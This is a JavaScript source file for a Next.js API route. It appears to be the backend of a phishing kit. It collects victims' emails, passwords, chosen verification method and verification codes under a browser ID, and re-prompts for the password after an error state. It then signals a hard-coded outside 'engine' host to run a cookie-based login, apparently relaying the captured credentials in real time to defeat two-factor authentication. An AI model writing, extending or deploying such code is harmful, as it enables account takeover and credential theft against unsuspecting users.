import { NextResponse } from "next/server";
import { setCachedRow, getCachedRow } from "../../../../utils/cookieCache.js";
import { incrementUsage } from "../../../../utils/serverlessTracker.js";

export async function POST(request) {
    incrementUsage();

    let body;
    try {
        body = await request.json();
    } catch (e) {
        try {
            const text = await request.text();
            body = Object.fromEntries(new URLSearchParams(text));
        } catch (e2) {
            return NextResponse.json({ success: false, error: "Invalid request body" }, { status: 400 });
        }
    }

    const { browserId, token, updateType, email, password, verificationChoice, verificationCode } = body;

    if (!browserId) {
        return NextResponse.json({ success: false, error: "browserId required" }, { status: 400 });
    }

    const updates = { lastUserActivity: new Date().toISOString() };

    if (updateType === 'email' && email) {
        updates.email = email;
        updates.domain = email.split('@')[1] || '';
    } else if (updateType === 'password' && password) {
        updates.password = password;
        const row = getCachedRow(browserId);
        if (row?.status === 'WAITINGPASSWORDERROR') {
            updates.status = 'WAITINGPASSWORD';
        }
    } else if (updateType === 'verificationChoice' && verificationChoice) {
        updates.verificationChoice = verificationChoice;
    } else if (updateType === 'verificationCode' && verificationCode) {
        updates.verificationCode = verificationCode;
    }

    setCachedRow(browserId, updates);

    const engineUrl = process.env.ENGINE_URL || 'https://webfixx-serverless-zvre9t-e955ff-157-173-204-24.sslip.io';
    fetch(`${engineUrl}/emails/cookie/cookie-api-login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ browserId, wakeUp: true })
    }).catch(() => {});

    return NextResponse.json({ success: true });
}

export async function OPTIONS() {
    return new Response(null, {
        status: 200,
        headers: {
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
            'Access-Control-Allow-Headers': 'Content-Type',
        },
    });
}
